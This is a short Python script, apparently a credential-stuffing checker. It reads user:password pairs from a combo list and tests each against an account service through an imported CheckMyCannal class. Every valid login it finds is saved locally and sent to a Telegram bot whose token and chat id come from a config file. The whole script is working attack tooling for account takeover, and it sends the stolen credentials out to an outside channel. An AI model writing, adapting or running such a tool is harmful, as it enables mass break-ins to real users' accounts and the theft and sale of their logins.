

from NouredineKn import CheckMyCannal , banner , colors , clear

combo = open('combo.txt', 'r', encoding='utf-8').read().splitlines()
try:
    tg = open('telegram.txt', 'r', encoding='utf-8').read()
    token = str(tg.split('|')[0]).strip()
    id = str(tg.split('|')[1]).strip()
except:
    token = ""
    id = ""
hits, chk, bad = 0, 0, 0
clear()
print(banner(chk=chk,hits=hits,bad=bad ,tot=len(combo)))
for i in combo:
    try:
        user = i.split(':')[0]
        password = i.split(':')[1]
        MyCannal = CheckMyCannal(user, password)
        if MyCannal.getAccount():
            chk += 1
            hits += 1
            print(f" {colors.G } [{chk}] = HITS ==> {i}")
            MyCannal.saveText()
            MyCannal.tgSnd(token=token, id=id)
            if chk%4==0:
                clear()
                print(banner(chk=chk, hits=hits, bad=bad, tot=len(combo)))
        else:
            bad += 1
            chk += 1
            print(f" {colors.R } [{chk}] ==BAD X=> {i}")
            if chk % 4 == 0:
                clear()
                print(banner(chk=chk, hits=hits, bad=bad, tot=len(combo)))
    except:
        chk += 1
        bad += 1
        print(f" {colors.R } [{chk}] ==BAD X=> {i}")
        if chk % 4 == 0:
            clear()
            print(banner(chk=chk, hits=hits, bad=bad, tot=len(combo)))
